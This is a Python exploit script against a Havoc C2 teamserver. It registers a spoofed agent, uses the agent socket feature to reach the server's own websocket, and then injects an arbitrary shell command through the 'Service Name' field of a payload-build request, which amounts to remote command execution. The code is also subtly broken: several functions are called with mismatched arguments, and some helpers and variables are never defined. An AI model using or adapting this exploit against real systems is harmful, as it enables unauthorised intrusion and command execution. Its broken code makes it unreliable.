import hashlib
import json,ssl,os,sys,re
import binascii,random,requests
import argparse
import urllib3
from websocket import create_connection  # pip install websocket-client
from Crypto.Cipher import AES
from Crypto.Util import Counter

##
##

# Disable SSL warnings
urllib3.disable_warnings()

# Configuration
HOSTNAME = "192.168.167.129"
PORT = 40056
USER = "Neo"  #  gotta be real
PASSWORD = "password1234"  
key_bytes = 32

def run_websocket_connection(hostname, port):
    """Establish a WebSocket connection to the teamserver."""
    ws = create_connection(
        f"wss://{hostname}:{port}/havoc/",
        sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False},
    )
    return ws

def authenticate(ws):
    """Authenticate to the teamserver."""
    print("[*] Authenticating to the teamserver...")
    payload = {
        "Body": {
            "Info": {
                "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),
                "User": USER,
            },
            "SubEvent": 3,
        },
        "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER},
    }
    ws.send(json.dumps(payload))
    response = json.loads(ws.recv())
    print(f"[+] Authentication response: {response}")

def register_agent(ws, hostname, username, domain_name, internal_ip, process_name, process_id):
    """Register a new agent with the teamserver."""
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data = b"\xab" * 100

    header_data = (
        command + request_id + AES_Key + AES_IV + demon_id +
        hostname_length + hostname + username_length + username +
        domain_name_length + domain_name + internal_ip_length + internal_ip +
        process_name_length + process_name + process_id + data
    )

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")

def open_socket(ws, socket_id, target_address, target_port):
    """Open a socket on the teamserver."""
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"
    subcommand = b"\x00\x00\x00\x10"
    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"

    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand + socket_id + local_addr + local_port + forward_addr + forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")

def write_socket(ws, socket_id, data):
    """Write data to the socket."""
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"
    subcommand = b"\x00\x00\x00\x11"
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand + socket_id + socket_type + success + data_length + data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")

def read_socket(ws, socket_id):
    """Read data from the socket."""
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""

    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]

def int_to_bytes(value, length=4, byteorder="big"):
    """Convert an integer to bytes."""
    return value.to_bytes(length, byteorder)

def encrypt(key, iv, plaintext):
    """Encrypt plaintext using AES CTR mode."""
    if len(key) <= key_bytes:
        for x in range(len(key), key_bytes):
            key = key + b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    ciphertext = aes.encrypt(plaintext)
    return ciphertext

##
##

# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal IP for the spoofed agent", default="10.1.33.7")
parser.add_argument("-c", "--command", help="The command to inject", required=True)  # New argument for command injection

##
##
args = parser.parse_args()

# Constants
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
    "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))

# Register the agent
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

# Open a socket
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

# Use the injected command from the argument
cmd = args.command
injection = f""" \\\\\\\" -mbla; {cmd} 1>&2 && false #"""
payload = {
    "Body": {
        "Info": {
            "AgentType": "Demon",
            "Arch": "x64",
            "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n",
            "Format": "Windows Service Exe",
            "Listener": "abc"
        },
        "SubEvent": 2
    },
    "Head": {
        "Event": 5,
        "OneTime": "true",
        "Time": "18:39:04",
        "User": USER
    }
}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

# Close the WebSocket connection
ws.close()
print("[+] Exploit completed!")

##
##
